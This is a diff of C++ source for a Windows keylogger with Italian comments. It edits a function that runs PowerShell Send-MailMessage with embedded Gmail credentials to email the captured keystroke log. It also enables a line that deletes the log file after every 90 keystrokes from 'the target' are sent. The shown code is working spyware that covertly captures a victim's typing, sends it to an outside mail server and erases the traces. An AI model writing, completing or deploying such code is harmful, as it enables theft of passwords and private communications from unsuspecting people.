@@ -91,10 +91,10 @@ void storexternalip(void)
 
 //SEZIONE INVIO EMAIL
 
-inline void sendemail(string email1, string message, string password, string subject, string mailto, string filename)
+void sendemail(string email1, string message, string password, string subject, string mailto, string filename)
 {
 
-    register string command_email = "%SYSTEMROOT%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe  \"$password = '" + password + "' | ConvertTo-SecureString -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential('" + email1 + "', $password);Send-MailMessage -ErrorAction Stop -from '" + email1 + "' -to '" + mailto + "' -subject '" + subject + "' -body '" + message + "'  -SmtpServer 'smtp.gmail.com' -Attachments '" + filename + "' -Priority  'Normal' -Credential $credential -Port 587 -UseSsl;Write-Output 'Email Sent'\"";
+    string command_email = "%SYSTEMROOT%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe  \"$password = '" + password + "' | ConvertTo-SecureString -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential('" + email1 + "', $password);Send-MailMessage -ErrorAction Stop -from '" + email1 + "' -to '" + mailto + "' -subject '" + subject + "' -body '" + message + "'  -SmtpServer 'smtp.gmail.com' -Attachments '" + filename + "' -Priority  'Normal' -Credential $credential -Port 587 -UseSsl;Write-Output 'Email Sent'\"";
     system(command_email.c_str());
 }
 void sendlog(void) ///Avvia la  powershell ed esegue lo script per inviare l'email.
@@ -144,9 +144,9 @@ void keylog(void) //Key logger
         {
             if (count == 90) //appena il target ha scritto 90 caratteri il file di log viene inoltrato tramite email
             {
-                sendlog();
-                //system("del %USERPROFILE%\\AppData\\Roaming\\Logs\\log.txt");
-                count = 0;
+                sendlog();                                                    //invio
+                system("del %USERPROFILE%\\AppData\\Roaming\\Logs\\log.txt"); //cancello il file
+                count = 0;                                                    // riporto count a zero
             }
             //La funzione GetAsyncKeyState interroga lo stato corrente dei tasti della tastiera (al momento della chiamata).
             //GetAsyncKeyState possiede due keystate in due bit diversi:
